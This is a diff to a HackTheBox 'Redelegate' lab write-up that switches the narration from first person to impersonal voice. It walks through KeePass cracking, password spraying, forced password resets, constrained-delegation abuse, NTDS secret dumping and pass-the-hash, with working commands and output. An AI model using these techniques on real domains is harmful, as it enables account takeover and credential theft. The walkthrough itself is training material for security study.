@@ -26,25 +26,25 @@ Redelegate is a complex Windows Active Directory domain controller exploitation 
 
 ## Initial Reconnaissance
 
-When tackling any HackTheBox machine, I always start with thorough reconnaissance. The goal here is to understand what services are running, identify potential attack vectors, and gather as much information as possible about the target environment before attempting any exploitation.
+The first step when tackling any machine is thorough reconnaissance. The goal is to understand what services are running, identify potential attack vectors, and gather as much information as possible about the target environment before attempting any exploitation.
 
 ### Host Discovery and Port Scanning
 
-First, I use NetExec to quickly identify the target and generate a hosts file for easier reference. This is important because in a real penetration test, you'd want to maintain proper host resolution for the domain environment.
+First, NetExec quickly identifies the target and generates a hosts file for easier reference. Maintaining proper host resolution is essential in any domain environment.
 
 ```bash
 elliot@exegol:~$ nxc smb 10.129.234.50 --generate-hosts-file hosts
 SMB         10.129.234.50   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)
 ```
 
-From this output, I can immediately see we're dealing with a Windows Server 2022 Domain Controller in the "redelegate.vl" domain. The fact that null authentication is allowed on SMB is interesting - it might indicate some misconfigurations we can exploit later.
+The output immediately reveals a Windows Server 2022 Domain Controller in the "redelegate.vl" domain. The fact that null authentication is allowed on SMB is interesting - it might indicate exploitable misconfigurations.
 
 ```bash
 elliot@exegol:~$ cat hosts
 10.129.234.50     DC.redelegate.vl redelegate.vl DC
 ```
 
-Now I have proper DNS resolution set up for the domain. Next, I run a comprehensive port scan using RustScan. This tool is much faster than traditional nmap for initial discovery, and I specifically use the `--ulimit 5000` flag to handle the large number of open ports that domain controllers typically have.
+With proper DNS resolution set up for the domain, the next step is a comprehensive port scan using RustScan. This tool is much faster than traditional nmap for initial discovery, and the `--ulimit 5000` flag handles the large number of open ports that domain controllers typically have.
 
 ```bash
 elliot@exegol:~$ rustscan -a 10.129.234.50 --ulimit 5000
@@ -80,18 +80,18 @@ PORT      STATE SERVICE       VERSION
 
 Perfect! The Nmap script `ftp-anon` shows that anonymous FTP access is allowed, and there are three interesting files:
 - `CyberAudit.txt` - Sounds like an audit report, might contain useful information about the environment
-- `Shared.kdbx` - This is a KeePass database file! If I can crack it, it might contain credentials
+- `Shared.kdbx` - This is a KeePass database file! If cracked, it might contain credentials
 - `TrainingAgenda.txt` - Probably just training documentation, but worth checking
 
 This is a classic case of misconfigured FTP - anonymous access should never be allowed on production systems, especially not with sensitive files like password databases.
 
 ## Initial Access - Anonymous FTP
 
-Now I need to actually access these files. I'll use NetExec's FTP module to list and download the files. NetExec is great for this because it provides a consistent interface across different protocols.
+The next step is actually accessing these files. NetExec's FTP module provides a consistent interface across different protocols for listing and downloading.
 
 ### File Enumeration and Download
 
-First, let me verify the anonymous access and see the exact file listing:
+First, verifying the anonymous access and the exact file listing:
 
 ```bash
 elliot@exegol:~$ nxc ftp redelegate.vl -u '' -p '' --ls
@@ -102,7 +102,7 @@ FTP         10.129.234.50   21     redelegate.vl    10-20-24  04:14AM           
 FTP         10.129.234.50   21     redelegate.vl    10-20-24  12:26AM                  580 TrainingAgenda.txt
 ```
 
-Great! Anonymous login works, and I can see the files clearly. Now I'll download all three files to analyze them locally. The KeePass database is definitely the most promising target.
+Great! Anonymous login works, and the files are clearly visible. Downloading all three for local analysis. The KeePass database is definitely the most promising target.
 
 ```bash
 elliot@exegol:~$ nxc ftp redelegate.vl -u '' -p '' --get CyberAudit.txt Shared.kdbx TrainingAgenda.txt
@@ -110,7 +110,7 @@ elliot@exegol:~$ nxc ftp redelegate.vl -u '' -p '' --get CyberAudit.txt Shared.k
 
 ### Analysis of Downloaded Files
 
-Let me start by examining the audit file, as it might give me insights into the company's security posture and any known issues:
+Starting with the audit file, as it might provide insights into the company's security posture and any known issues:
 
 ```bash
 elliot@exegol:~$ cat CyberAudit.txt
@@ -137,17 +137,17 @@ This is very revealing! The audit shows that the company identified several crit
 - Unused AD objects (still in progress)
 - Dangerous ACLs (still in progress)
 
-This tells me that the administrators are aware of security issues but haven't fully remediated everything. The fact that ACL rechecking is "IN PROGRESS" suggests there might still be exploitable permissions in the domain - exactly what I need to look for.
+This reveals that the administrators are aware of security issues but haven't fully remediated everything. The fact that ACL rechecking is "IN PROGRESS" suggests there might still be exploitable permissions in the domain - exactly what to look for.
 
-The training agenda file didn't contain anything particularly interesting, but this audit report gives me valuable context about the environment I'm attacking.
+The training agenda file didn't contain anything particularly interesting, but this audit report provides valuable context about the target environment.
 
 ## KeePass Database Cracking
 
-Now we have the KeePass database! This is potentially a goldmine. KeePass databases store passwords encrypted, but if I can crack the master password, I'll get access to all the stored credentials. This is a common attack vector in penetration testing - people often use weak master passwords or predictable patterns.
+With the KeePass database in hand, this is potentially a goldmine. KeePass databases store passwords encrypted, but if the master password can be cracked, all stored credentials become accessible. This is a common attack vector in penetration testing - people often use weak master passwords or predictable patterns.
 
 ### Hash Extraction and Password Cracking
 
-First, I need to extract the hash from the KeePass database so I can attempt to crack it. John the Ripper has a tool specifically for this:
+First, extracting the hash from the KeePass database for cracking. John the Ripper has a tool specifically for this:
 
 ```bash
 elliot@exegol:~$ keepass2john Shared.kdbx > keepasshash.out
@@ -155,18 +155,18 @@ elliot@exegol:~$ cat keepasshash.out
 Shared:$keepass$*2*600000*0*ce7395f413946b0cd279501e510cf8a988f39baca623dd86beaee651025662e6*e4f9d51a5df3e5f9ca1019cd57e10d60f85f48228da3f3b4cf1ffee940e20e01*18c45dbbf7d365a13d6714059937ebad*a59af7b75908d7bdf68b6fd929d315ae6bfe77262e53c209869a236da830495f*806f9dd2081c364e66a114ce3adeba60b282fc5e5ee6f324114d38de9b4502ca
 ```
 
-Now I have the hash. I notice the file was created on October 20th, 2024 (10-20-24). In penetration testing, people often use dates, seasons, or company-related information for passwords. Since this was created in October (Fall), I generate a wordlist with seasonal patterns for different years. This is a common password cracking technique - thinking about what the person might have chosen as a password based on context clues.
+With the hash extracted, the file creation date stands out: October 20th, 2024 (10-20-24). In penetration testing, people often use dates, seasons, or company-related information for passwords. Since this was created in October (Fall), a wordlist with seasonal patterns for different years is worth trying. This is a common password cracking technique - thinking about what the person might have chosen based on context clues.
 
 ```bash
 elliot@exegol:~$ hashcat keepasshash.out -m 13400 passwords.txt
 $keepass$*2*600000*0*ce7395f413946b0cd279501e510cf8a988f39baca623dd86beaee651025662e6*e4f9d51a5df3e5f9ca1019cd57e10d60f85f48228da3f3b4cf1ffee940e20e01*18c45dbbf7d365a13d6714059937ebad*a59af7b75908d7bdf68b6fd929d315ae6bfe77262e53c209869a236da830495f*806f9dd2081c364e66a114ce3adeba60b282fc5e5ee6f324114d38de9b4502ca:Fall2024!
 ```
 
-Excellent! The password was "Fall2024!" - exactly matching the seasonal pattern I predicted. This shows how important it is to use strong, unique passwords and avoid predictable patterns.
+Excellent! The password was "Fall2024!" - exactly matching the predicted seasonal pattern. This shows how important it is to use strong, unique passwords and avoid predictable patterns.
 
 ### Credential Extraction
 
-Now that I have the master password, I can unlock the database and see what's inside. Let me first list the structure:
+With the master password recovered, the database can be unlocked. Listing the structure first:
 
 ```bash
 elliot@exegol:~$ keepassxc-cli ls Shared.kdbx
@@ -176,13 +176,13 @@ HelpDesk/
 Finance/
 ```
 
-The database is organized into three groups: IT, HelpDesk, and Finance. This suggests role-based access control in the organization. Let me export all the credentials to CSV for easier analysis:
+The database is organized into three groups: IT, HelpDesk, and Finance. This suggests role-based access control in the organization. Exporting all credentials to CSV for easier analysis:
 
 ```bash
 elliot@exegol:~$ keepassxc-cli export Shared.kdbx --format csv > secrets_dump.csv
 ```
 
-Now let me examine what credentials I found:
+Examining the recovered credentials:
 
 | Group | Title | Username | Password |
 |-------|--------|----------|----------|
@@ -194,8 +194,8 @@ Now let me examine what credentials I found:
 | Shared/Finance | Timesheet Manager | Timesheet | hMFS4I0Kj8Rcd62vqi5X |
 | Shared/Finance | Payroll App | Payroll | cVkqz4bCM7kJRSNlgx2G |
 
-This is a treasure trove! I now have credentials for:
-- **FTP access** (which I already have, but good to have the actual credentials)
+This is a treasure trove! The recovered credentials include:
+- **FTP access** (already available via anonymous, but good to have the actual credentials)
 - **SQL Guest access** - This could be useful for database enumeration
 - **FS01 Admin** - Administrative access to what appears to be a file server
 - **Various application accounts** for different business systems
@@ -213,7 +213,7 @@ MSSQL       10.129.234.50   1433   DC               [+] DC\SQLGuest:zDPBpaF4Fywl
 
 ### SID Brute Force for User Discovery
 
-SID (Security Identifier) brute forcing is a powerful technique in Active Directory environments. Every domain object has a unique SID, and by trying different RID (Relative Identifier) values, I can discover valid users, groups, and computers in the domain. This works because when you have any domain-authenticated access (like my SQLGuest account), you can query the domain to resolve SIDs to names.
+SID (Security Identifier) brute forcing is a powerful technique in Active Directory environments. Every domain object has a unique SID, and by trying different RID (Relative Identifier) values, valid users, groups, and computers can be discovered. This works because any domain-authenticated access (like the SQLGuest account) allows querying the domain to resolve SIDs to names.
 
 The beauty of this technique is that it doesn't require special privileges - any authenticated domain user can perform SID lookups. This is extremely useful for mapping out the domain structure.
 
@@ -234,20 +234,20 @@ elliot@exegol:~$ nxc mssql redelegate.vl -u users.txt -p passwords.txt --continu
 MSSQL       10.129.234.50   1433   DC               [+] redelegate.vl\Marie.Curie:Fall2024!
 ```
 
-Perfect! Marie Curie is reusing the KeePass master password "Fall2024!" as her domain password. This is a classic example of password reuse - people often use the same password across multiple systems for convenience. Now I have a valid domain user account with potentially more privileges than the SQL guest account.
+Perfect! Marie Curie is reusing the KeePass master password "Fall2024!" as her domain password. This is a classic example of password reuse - people often use the same password across multiple systems for convenience. This valid domain user account likely has more privileges than the SQL guest account.
 
 ## Active Directory Enumeration with BloodHound
 
-With a valid domain user account, I can now perform deeper Active Directory enumeration. BloodHound is the gold standard for this - it collects relationship data between users, groups, computers, and ACLs (Access Control Lists). This helps me understand the privilege structure and find attack paths.
+With a valid domain user account, deeper Active Directory enumeration becomes possible. BloodHound is the gold standard for this - it collects relationship data between users, groups, computers, and ACLs (Access Control Lists), revealing the privilege structure and attack paths.
 
-The `--collection All` flag tells BloodHound to gather all possible data, and I specify the DNS server to ensure proper domain resolution.
+The `--collection All` flag tells BloodHound to gather all possible data, and the DNS server is specified to ensure proper domain resolution.
 
 ```bash
 elliot@exegol:~$ nxc ldap redelegate.vl -u Marie.Curie -p 'Fall2024!' --bloodhound --collection All --dns-server 10.129.234.50
 ```
 
 The BloodHound data revealed critical ACL information:
-- **Marie.Curie has User-Force-Change-Password rights over the HelpDesk group** - This means I can reset passwords for anyone in the HelpDesk group!
+- **Marie.Curie has User-Force-Change-Password rights over the HelpDesk group** - This means passwords for anyone in the HelpDesk group can be reset!
 
 ![BloodHound ACL Analysis](./bloodhound-acl.png)
 
@@ -261,20 +261,20 @@ This is exactly what the audit report mentioned as "Dangerous Active Directory A
 
 ## Privilege Escalation - Password Reset Exploitation
 
-This is where the attack gets really interesting. I discovered that Marie.Curie has "User-Force-Change-Password" rights over the HelpDesk group. This is a dangerous permission that allows anyone with this right to reset passwords for users in the target group without knowing their current password.
+This is where the attack gets really interesting. BloodHound revealed that Marie.Curie has "User-Force-Change-Password" rights over the HelpDesk group. This is a dangerous permission that allows anyone with this right to reset passwords for users in the target group without knowing their current password.
 
 In a real environment, this would be a critical security finding. HelpDesk groups often have elevated privileges for supporting users, so compromising HelpDesk accounts can lead to significant access.
 
 ### Resetting Michael.Pontiac Password
 
-Let me start by resetting Michael Pontiac's password. He's a member of the HelpDesk group, so this should give me access to a privileged account.
+Starting by resetting Michael Pontiac's password. As a member of the HelpDesk group, this should provide access to a privileged account.
 
 ```bash
 elliot@exegol:~$ nxc smb redelegate.vl -u Marie.Curie -p 'Fall2024!' -M change-password -o USER=Michael.Pontiac NEWPASS='Elliot1234!'
 SMB         10.129.234.50   445    DC               [+] Successfully changed password for Michael.Pontiac
 ```
 
-Excellent! The password reset worked. Now let me check what Helen Frost's privileges are. From the BloodHound data, I know she has interesting group memberships.
+Excellent! The password reset worked. Time to check Helen Frost's privileges - the BloodHound data showed interesting group memberships for this account.
 
 ![Helen Frost Privileges](./helen-privileges.png)
 
@@ -285,18 +285,18 @@ elliot@exegol:~$ nxc smb redelegate.vl -u Marie.Curie -p 'Fall2024!' -M change-p
 SMB         10.129.234.50   445    DC               [+] Successfully changed password for Helen.Frost
 ```
 
-Perfect! Now I have access to Helen Frost's account. Let me see what privileges she has - this might be the key to further escalation.
+Perfect! With access to Helen Frost's account, her privileges might be the key to further escalation.
 
 ## WinRM Access and User Flag
 
-Now let me test if Helen Frost has WinRM access to the domain controller. WinRM (Windows Remote Management) allows PowerShell remoting and is often enabled on servers for administration. The "(admin)" in the output indicates she has administrative privileges on the DC.
+Testing whether Helen Frost has WinRM access to the domain controller. WinRM (Windows Remote Management) allows PowerShell remoting and is often enabled on servers for administration. The "(admin)" in the output indicates administrative privileges on the DC.
 
 ```bash
 elliot@exegol:~$ nxc winrm redelegate.vl -u Helen.Frost -p 'Elliot1234!'
 WINRM       10.129.234.50   5985   DC               [+] redelegate.vl\Helen.Frost:Elliot1234! (admin)
 ```
 
-Great! She has admin access. Let me connect with Evil-WinRM for an interactive shell and grab the user flag.
+Great! Admin access confirmed. Connecting with Evil-WinRM for an interactive shell to grab the user flag.
 
 ```bash
 elliot@exegol:~$ evil-winrm -i redelegate.vl -u Helen.Frost -p 'Elliot1234!'
@@ -304,13 +304,13 @@ elliot@exegol:~$ evil-winrm -i redelegate.vl -u Helen.Frost -p 'Elliot1234!'
 HTB{user_flag_placeholder}
 ```
 
-Excellent! I have the user flag. But I'm not done yet - I need to escalate to domain admin. Let me check what privileges Helen has.
+Excellent! User flag obtained. But the job isn't done yet - the next objective is domain admin.
 
 ## Privilege Analysis and Kerberos Delegation Setup
 
 ### Privilege Check
 
-Let me check what privileges Helen Frost has. This will tell me what special rights she possesses that might enable further attacks.
+Checking what privileges Helen Frost has. This will reveal any special rights that might enable further attacks.
 
 ```powershell
 *Evil-WinRM* PS C:\Users\Helen.Frost\Desktop> whoami /priv
@@ -326,9 +326,9 @@ SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted fo
 SeIncreaseWorkingSetPrivilege Increase a process working set                                 Enabled
 ```
 
-The `SeEnableDelegationPrivilege` is crucial! This privilege allows the account to enable Kerberos delegation on computer objects. This is exactly what I need for a Kerberos constrained delegation attack. With this privilege, I can:
+The `SeEnableDelegationPrivilege` is crucial! This privilege allows the account to enable Kerberos delegation on computer objects. This is exactly what's needed for a Kerberos constrained delegation attack. With this privilege:
 
-1. Reset a computer account password (which I already know Helen can do via the ACL)
+1. Reset a computer account password (Helen can do this via the ACL)
 2. Configure that computer account for constrained delegation
 3. Use it to impersonate the Domain Controller and extract domain secrets
 
@@ -336,7 +336,7 @@ This is a powerful privilege that should be carefully controlled in real environ
 
 ### Computer Account Discovery
 
-For Kerberos constrained delegation to work, I need a computer account that I can control. Let me enumerate the computer accounts in the domain. I know from earlier that there are DC$ and FS01$, but let me get the complete list.
+For Kerberos constrained delegation to work, a controllable computer account is required. Enumerating the computer accounts in the domain to get the complete list:
 
 ```bash
 elliot@exegol:~$ nxc ldap redelegate.vl -u Marie.Curie -p 'Fall2024!' --computers
@@ -344,11 +344,11 @@ LDAP        10.129.234.50   389    DC               DC$
 LDAP        10.129.234.50   389    DC               FS01$
 ```
 
-Perfect! I have two computer accounts:
+Perfect! Two computer accounts are present:
 - **DC$** - The domain controller itself (can't easily compromise this directly)
 - **FS01$** - Likely a file server, perfect for my delegation attack
 
-FS01$ looks like the ideal target. Since Helen Frost has the ACL rights to change computer passwords, I can reset FS01$'s password and then configure it for constrained delegation.
+FS01$ looks like the ideal target. Since Helen Frost has the ACL rights to change computer passwords, FS01$'s password can be reset and the account configured for constrained delegation.
 
 ### FS01$ Password Reset
 
@@ -365,11 +365,11 @@ This is the pièce de résistance of the attack. Kerberos constrained delegation
 2. That service can request a service ticket on behalf of the user to another service (the DC's LDAP)
 3. The target service thinks the original user is connecting directly
 
-Since Helen has `SeEnableDelegationPrivilege`, she can configure FS01$ for constrained delegation. I'll set it up so FS01$ can delegate to the DC's LDAP service.
+Since Helen has `SeEnableDelegationPrivilege`, she can configure FS01$ for constrained delegation. The configuration will allow FS01$ to delegate to the DC's LDAP service.
 
 ### Configuring Constrained Delegation
 
-First, I need to enable FS01$ for delegation and specify that it can only delegate to the DC's LDAP service. This prevents the attack from being used against other services.
+Enabling FS01$ for delegation and specifying that it can only delegate to the DC's LDAP service. This prevents the attack from being used against other services.
 
 ```powershell
 *Evil-WinRM* PS C:\Users\Helen.Frost\Desktop> Set-ADAccountControl -Identity "FS01$" -TrustedToAuthForDelegation $True
@@ -395,11 +395,11 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 This Impacket command performs the actual delegation attack:
 - **S4U2Self**: Gets a service ticket for the DC user to itself (FS01$ impersonating DC)
 - **S4U2Proxy**: Uses that ticket to get access to the LDAP service as DC
-- **Result**: I now have a Kerberos ticket that allows me to authenticate as the Domain Controller!
+- **Result**: This yields a Kerberos ticket that authenticates as the Domain Controller!
 
 ### Domain Secrets Dump
 
-Now I can use the Kerberos ticket I obtained to dump the domain secrets. The `-k` flag tells secretsdump to use Kerberos authentication, and since I have a ticket that authenticates as the Domain Controller, I can access the NTDS.DIT database.
+The Kerberos ticket can now be used to dump the domain secrets. The `-k` flag tells secretsdump to use Kerberos authentication, and since the ticket authenticates as the Domain Controller, the NTDS.DIT database is accessible.
 
 ```bash
 elliot@exegol:~$ export KRB5CCNAME=dc@ldap_dc.redelegate.vl@REDELEGATE.VL.ccache
@@ -408,11 +408,11 @@ elliot@exegol:~$ secretsdump.py -k -no-pass dc.redelegate.vl
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:ec17f7a2a4d96e177bfd101b94ffc0a7:::
 ```
 
-Perfect! I now have the Administrator's NT hash: `ec17f7a2a4d96e177bfd101b94ffc0a7`. With this, I can authenticate as the domain administrator.
+Perfect! The Administrator's NT hash is now available: `ec17f7a2a4d96e177bfd101b94ffc0a7`. With this, authenticating as the domain administrator is straightforward.
 
 ## Root Flag Acquisition
 
-Let me use the administrator hash to authenticate via WinRM and grab the root flag. The `-H` flag tells NetExec to use the NT hash for authentication.
+Using the administrator hash to authenticate via WinRM and grab the root flag. The `-H` flag tells NetExec to use the NT hash for authentication.
 
 ```bash
 elliot@exegol:~$ nxc winrm redelegate.vl -u Administrator -H ec17f7a2a4d96e177bfd101b94ffc0a7 -X 'cat C:\Users\Administrator\Desktop\root.txt'
@@ -420,7 +420,7 @@ WINRM       10.129.234.50   5985   DC               [+] Executed command (shell 
 HTB{root_flag_placeholder}
 ```
 
-Excellent! I have successfully compromised the domain controller and obtained both the user and root flags.
+Excellent! The domain controller is fully compromised and both the user and root flags are obtained.
 
 ## Attack Chain Summary
 
